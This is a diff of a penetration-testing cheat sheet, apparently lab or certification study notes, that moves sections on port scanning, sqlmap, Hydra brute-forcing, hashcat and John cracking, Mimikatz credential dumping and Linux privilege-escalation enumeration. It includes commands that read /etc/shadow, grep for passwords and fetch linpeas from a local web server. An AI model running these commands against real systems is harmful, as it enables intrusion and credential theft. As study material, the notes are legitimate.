@@ -22,7 +22,329 @@ ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" USER@IP
 xfreerdp3 /u:USER/p:PASS /v:IP /dynamic-resolution
 ```
 
+### Reconnaissance and Enumeration
+
+``` sh
+# Standard actions
+sudo nmap -p- IP
+sudo nmap -p PORTS -A IP
+```
+
+### Scanning
+
+#### Netcat
+
+```sh
+# Netcat TCP ports 3388-3390, 1 second timeout, zero I/O (data)
+nc -nvv -w 1 -z IP 3388-3390
+# Netcat UDP ports 120-123, 1 second timeout, zero I/O (data)
+nc -nv -u -z -w 1 IP 120-123
+```
+
+#### Nikto
+
+HTTP(S) only.
+
+```sh
+nikto -h http://target.com
+```
+
+#### Nmap
+
+```sh
+# Scan all TCP ports, stealth and fast (no ACK)
+sudo nmap -sU -sS -vv IP
+# Discovery scan, greppable format
+nmap -v -sn IP -oG ping-sweep.txt
+grep Up ping-sweep.txt | cut -d " " -f 2
+# TCP scan, top 20 ports, with OS version detection, script scanning, and traceroute
+nmap -sT -A --top-ports=20 IP -oG top-port-sweep.txt
+# OS fingerprinting (guess)
+sudo nmap -O IP --osscan-guess
+# Vulnerability scan
+sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
+```
+
+#### Nuclei
+
+```sh
+nuclei -target https://example.com
+```
+
+#### PowerShell
+
+```ps1
+# PowerShell scanning (living off the land)
+Test-NetConnection -Port 445 IP
+# PowerShell scan first 1024 ports
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
+```
+
+### Exploitation
+
+#### Exploits
+
+##### SearchSploit
+
+[Exploit-DB](https://www.exploit-db.com/)
+
+```sh
+sudo apt update && sudo apt install exploitdb
+
+# Search terms
+searchsploit afd windows local
+# Show complete path
+searchsploit -p 39446
+# Exclude
+searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+# Strict
+searchsploit -s Apache Struts 2.0.0
+# JSON output
+searchsploit -j 55555 | json_pp
+# Download
+searchsploit -m windows/remote/48537.py
+searchsploit -m 42031
+```
+
+#### Command Injection
+
+[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
+
+#### SQL Injection
+
+##### Payloads
+
+[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) 
+
+##### sqlmap
+
+```sh
+# sqlmap
+sqlmap -u http://IP/index.php?user=1 -p user
+# sqlmap with saved POST request
+sqlmap -r post.txt -p user 
+# sqlmap with dump
+sqlmap -u http://IP/index.php?user=1 -p user --dump
+# sqlmap with shell
+sqlmap -u http://IP/index.php?user=1 -p user --os-shell
+```
+
+#### Password Attacks
+
+##### Brute Force
+
+[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
+
+[https://weakpass.com/](https://weakpass.com/)
+
+[https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
+
+[https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables](https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables)
+
+###### Wordlists
+
+```sh
+# Kali lists
+# Passwords
+/usr/share/wordlists/rockyou.txt
+# Usernames
+/usr/share/wordlists/dirb/others/names.txt 
+
+# Generate wordlist with min/max 6 characters (lab***)
+crunch 6 6 -t lab%%% > wordlist
+```
+
+###### Hydra
+
+```sh
+# Attempt single user name with password list
+hydra -l USER -P PASSLIST -s PORT PROTO://IP
+# Attempt login on HTTP POST form
+hydra -l USER -P PASSLIST IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+# HTTP get (basic auth)
+hydra -L USERLIST -P PASSLIST IP http-get /path/to/login
+# HTTP basic auth, no 10s wait, verbose, failure=401
+hydra -I -V -l USER -P PASSLIST "http-get://IP/webdav:A=BASIC:F=401"
+# RDP single task (throttled to limit errors)
+hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://IP -t 1 -v
+# SSH
+hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh -V
+```
+
+###### JohnTheRipper
+
+``` sh
+# Run with ruleset
+john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+# Convert SSH hash
+ssh2john id_rsa > ssh.hash 
+```
+
+##### Cracking
+
+[https://hashcat.net/hashcat/](https://hashcat.net/hashcat/) (mainly GPU, also support CPU)
+
+[https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) (hash modes and example hashes)
+
+[https://hashcat.net/wiki/doku.php?id=rule\_based\_attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack) (rule functions)
+
+[https://www.openwall.com/john/](https://www.openwall.com/john/) (mainly CPU, also supports GPU)
+
+###### Hashcat
+
+```sh
+# Check hash modes available
+hashcat -h | grep -i "ssh"
+# Benchmark mode
+hashcat -b
+# Brute force MD5
+hashcat -m 0
+# Use rules, debug mode 
+hashcat -r demo.rule --stdout wordlist.txt
+# Rule to append !, 1, and capitalize first letter en lowercase the rest
+$! $1 c
+# Included rules
+ls -la /usr/share/hashcat/rules/
+# Crack MD5 with ruleset
+hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r rules.rule
+
+# Identify hash type
+hash-identifier
+hashid
+
+# KeePass example
+# Find KeePass database file (Windows)
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+# Convert KeePass database file to hash (remove filename in file)
+keepass2john Database.kdbx > keepass.hash
+cat keepass.hash   
+	$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
+# Crack password
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+# NTLM
+# Get local users
+Get-LocalUser
+# Run Mimikatz in elevated PowerShell window
+.\mimikatz.exe
+# Enable SeDebugPrivilege for needed debug privs
+privilege::debug
+# Elevate to SYSTEM privs
+token::elevate
+# Option 1 (local user): extract NThashes from SAM
+lsadump::sam
+# Option 2 (domain user): extract NThashes from LSASS
+sekurlsa::logonpasswords
+# Crack NThash with Hashcat, with best66 rules
+hashcat -m 1000 HASHFILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
+```
+
+### Privilege Escalation
+
+[HackTricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) 
+[compendium by g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+[PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/)
+
+#### Enumeration
+
+```sh
+# Basics
+id
+whoami
+hostname
+uname -a
+arch
+cat /etc/os-release
+groups
+env
+set
+ps aux | cat
+# Enumerate packages and kernel modules for vulnerabilities
+dpkg -l
+lsmod
+/sbin/modinfo <BINARY>
+# Enumerate network configuration
+ip a
+route
+routel
+netstat -tulnp
+ls -la /home
+# Enumerate users
+cat /etc/passwd
+cat /etc/shadow
+# Enumerate cronjobs
+cat /etc/crontab
+crontab -l
+sudo crontab -l
+ls -la /etc/cron*
+grep -i "CRON" /var/log/syslog
+# Display processes running in Linux with pspy
+# https://github.com/dominicbreuker/pspy
+# Look for cmdline processes
+cat /proc/self/cmdline 
+# Check SSH config
+# Check for: PermitRootLogin yes
+# Check for: (#)PasswordAuthentication yes
+cat /etc/ssh/sshd_config
+# SUID / GUID
+find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
+find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
+# Find all writable files/folders
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+find / -writable -type d 2>/dev/null
+ls -la /etc/passwd
+ls -la /etc/shadow
+ls -la /etc/sudoers
+# Look for commands in sudoers file
+sudo -l
+# Check sudo version
+sudo -V
+# Pivot to other user
+su USER
+# Check capabilities
+# https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
+getcap -r / 2>/dev/null
+# Check services
+systemctl list-units
+systemctl status SERVICE
+/etc/systemd/system/SERVICE.service
+# Find sensitive files (examples)
+grep -r "password" / 2>/dev/null
+grep -r "pass" /home 2>/dev/null
+grep -r "key" /opt 2>/dev/null
+# Find mounted drives
+mount
+cat /etc/fstab
+# Find available disks for mounting
+lsblk
+# Files in temporary directories
+ls -la /tmp
+ls -la /var/tmp
+ls -la /dev/shm
+
+# Run Linpeas
+python3 -m http.server 80
+wget http://LOCALIP/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+#### SUID/GUID
+
+Find binaries with SUID/GUID bit set. Use [GTFOBins](https://gtfobins.org/) to further exploit. Note that some binaries need to be run with `sudo` and therefore require the password of the local user.
+
+``` sh
+# SUID
+find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
+# GUID
+find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
+```
+
+
 ### Protocols
+
+Additional information per protocol.
 
 #### SSH (TCP: 22)
 
@@ -419,316 +741,6 @@ SELECT name FROM sys.databases;
 SELECT * FROM offsec.information_schema.tables;
 ```
 
-### Scanning (ports / vulns)
-
-#### Netcat
-
-```sh
-# Netcat TCP ports 3388-3390, 1 second timeout, zero I/O (data)
-nc -nvv -w 1 -z IP 3388-3390
-# Netcat UDP ports 120-123, 1 second timeout, zero I/O (data)
-nc -nv -u -z -w 1 IP 120-123
-```
-
-#### Nikto
-
-HTTP(S) only.
-
-```sh
-nikto -h http://target.com
-```
-
-#### Nmap
-
-```sh
-# Scan all TCP ports, stealth and fast (no ACK)
-sudo nmap -sU -sS -vv IP
-# Discovery scan, greppable format
-nmap -v -sn IP -oG ping-sweep.txt
-grep Up ping-sweep.txt | cut -d " " -f 2
-# TCP scan, top 20 ports, with OS version detection, script scanning, and traceroute
-nmap -sT -A --top-ports=20 IP -oG top-port-sweep.txt
-# OS fingerprinting (guess)
-sudo nmap -O IP --osscan-guess
-# Vulnerability scan
-sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
-```
-
-#### Nuclei
-
-```sh
-nuclei -target https://example.com
-```
-
-#### PowerShell
-
-```ps1
-# PowerShell scanning (living off the land)
-Test-NetConnection -Port 445 IP
-# PowerShell scan first 1024 ports
-1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
-```
-
-### Exploitation
-
-#### Exploits
-
-##### SearchSploit
-
-[Exploit-DB](https://www.exploit-db.com/)
-
-```sh
-sudo apt update && sudo apt install exploitdb
-
-# Search terms
-searchsploit afd windows local
-# Show complete path
-searchsploit -p 39446
-# Exclude
-searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
-# Strict
-searchsploit -s Apache Struts 2.0.0
-# JSON output
-searchsploit -j 55555 | json_pp
-# Download
-searchsploit -m windows/remote/48537.py
-searchsploit -m 42031
-```
-
-#### Command Injection
-
-[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
-
-#### SQL Injection
-
-##### Payloads
-
-[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) 
-
-##### sqlmap
-
-```sh
-# sqlmap
-sqlmap -u http://IP/index.php?user=1 -p user
-# sqlmap with saved POST request
-sqlmap -r post.txt -p user 
-# sqlmap with dump
-sqlmap -u http://IP/index.php?user=1 -p user --dump
-# sqlmap with shell
-sqlmap -u http://IP/index.php?user=1 -p user --os-shell
-```
-
-#### Password Attacks
-
-##### Brute Force
-
-[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
-
-[https://weakpass.com/](https://weakpass.com/)
-
-[https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
-
-[https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables](https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables)
-
-###### Wordlists
-
-```sh
-# Kali lists
-# Passwords
-/usr/share/wordlists/rockyou.txt
-# Usernames
-/usr/share/wordlists/dirb/others/names.txt 
-
-# Generate wordlist with min/max 6 characters (lab***)
-crunch 6 6 -t lab%%% > wordlist
-```
-
-###### Hydra
-
-```sh
-# Attempt single user name with password list
-hydra -l USER -P PASSLIST -s PORT PROTO://IP
-# Attempt login on HTTP POST form
-hydra -l USER -P PASSLIST IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
-# HTTP get (basic auth)
-hydra -L USERLIST -P PASSLIST IP http-get /path/to/login
-# HTTP basic auth, no 10s wait, verbose, failure=401
-hydra -I -V -l USER -P PASSLIST "http-get://IP/webdav:A=BASIC:F=401"
-# RDP single task (throttled to limit errors)
-hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://IP -t 1 -v
-# SSH
-hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh -V
-```
-
-###### JohnTheRipper
-
-``` sh
-# Run with ruleset
-john --wordlist=ssh.passwords --rules=sshRules ssh.hash
-# Convert SSH hash
-ssh2john id_rsa > ssh.hash 
-```
-
-##### Cracking
-
-[https://hashcat.net/hashcat/](https://hashcat.net/hashcat/) (mainly GPU, also support CPU)
-
-[https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) (hash modes and example hashes)
-
-[https://hashcat.net/wiki/doku.php?id=rule\_based\_attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack) (rule functions)
-
-[https://www.openwall.com/john/](https://www.openwall.com/john/) (mainly CPU, also supports GPU)
-
-###### Hashcat
-
-```sh
-# Check hash modes available
-hashcat -h | grep -i "ssh"
-# Benchmark mode
-hashcat -b
-# Brute force MD5
-hashcat -m 0
-# Use rules, debug mode 
-hashcat -r demo.rule --stdout wordlist.txt
-# Rule to append !, 1, and capitalize first letter en lowercase the rest
-$! $1 c
-# Included rules
-ls -la /usr/share/hashcat/rules/
-# Crack MD5 with ruleset
-hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r rules.rule
-
-# Identify hash type
-hash-identifier
-hashid
-
-# KeePass example
-# Find KeePass database file (Windows)
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-
-# Convert KeePass database file to hash (remove filename in file)
-keepass2john Database.kdbx > keepass.hash
-cat keepass.hash   
-	$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
-# Crack password
-hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
-
-# NTLM
-# Get local users
-Get-LocalUser
-# Run Mimikatz in elevated PowerShell window
-.\mimikatz.exe
-# Enable SeDebugPrivilege for needed debug privs
-privilege::debug
-# Elevate to SYSTEM privs
-token::elevate
-# Option 1 (local user): extract NThashes from SAM
-lsadump::sam
-# Option 2 (domain user): extract NThashes from LSASS
-sekurlsa::logonpasswords
-# Crack NThash with Hashcat, with best66 rules
-hashcat -m 1000 HASHFILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
-```
-
-### Privilege Escalation
-
-[HackTricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) 
-[compendium by g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
-[PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/)
-
-#### Enumeration
-
-```sh
-# Basics
-id
-whoami
-hostname
-uname -a
-arch
-cat /etc/os-release
-groups
-env
-set
-ps aux | cat
-# Enumerate packages and kernel modules for vulnerabilities
-dpkg -l
-lsmod
-/sbin/modinfo <BINARY>
-# Enumerate network configuration
-ip a
-route
-routel
-netstat -tulnp
-ls -la /home
-# Enumerate users
-cat /etc/passwd
-cat /etc/shadow
-# Enumerate cronjobs
-cat /etc/crontab
-crontab -l
-sudo crontab -l
-ls -la /etc/cron*
-grep -i "CRON" /var/log/syslog
-# Display processes running in Linux with pspy
-# https://github.com/dominicbreuker/pspy
-# Look for cmdline processes
-cat /proc/self/cmdline 
-# Check SSH config
-# Check for: PermitRootLogin yes
-# Check for: (#)PasswordAuthentication yes
-cat /etc/ssh/sshd_config
-# SUID / GUID
-find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
-find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
-# Find all writable files/folders
-find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
-find / -writable -type d 2>/dev/null
-ls -la /etc/passwd
-ls -la /etc/shadow
-ls -la /etc/sudoers
-# Look for commands in sudoers file
-sudo -l
-# Check sudo version
-sudo -V
-# Pivot to other user
-su USER
-# Check capabilities
-# https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
-getcap -r / 2>/dev/null
-# Check services
-systemctl list-units
-systemctl status SERVICE
-/etc/systemd/system/SERVICE.service
-# Find sensitive files (examples)
-grep -r "password" / 2>/dev/null
-grep -r "pass" /home 2>/dev/null
-grep -r "key" /opt 2>/dev/null
-# Find mounted drives
-mount
-cat /etc/fstab
-# Find available disks for mounting
-lsblk
-# Files in temporary directories
-ls -la /tmp
-ls -la /var/tmp
-ls -la /dev/shm
-
-# Run Linpeas
-python3 -m http.server 80
-wget http://LOCALIP/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-```
-
-#### SUID/GUID
-
-Find binaries with SUID/GUID bit set. Use [GTFOBins](https://gtfobins.org/) to further exploit. Note that some binaries need to be run with `sudo` and therefore require the password of the local user.
-
-``` sh
-# SUID
-find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
-# GUID
-find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
-```
 
 ### Reverse Shells
 
